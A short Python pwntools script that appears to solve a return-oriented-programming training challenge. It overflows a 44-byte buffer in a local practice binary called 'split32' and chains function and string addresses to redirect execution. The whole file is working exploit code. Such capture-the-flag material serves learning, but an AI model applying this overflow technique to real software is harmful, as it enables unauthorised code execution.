#!/usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')

def pwn():

    e = ELF("./split32")

    ''' Create buffer '''
    buf = "A" * 44

    #system_addr = p32(0x08048649)
    system_addr = p32(e.symbols["usefulFunction"])
    arg_addr = p32(e.symbols["usefulString"])
    exit_addr = p32(0xf7debf10)
    #arg_addr = p32(0x0804a030)
    #arg_addr = p32(0x0804a030)
    #arg_addr = p32(0x0804a030)

    io = e.process()
    io.sendline(buf + system_addr + exit_addr + arg_addr)
    #io.interactive()
    print(io.recvall())

if __name__ == '__main__':
    pwn()
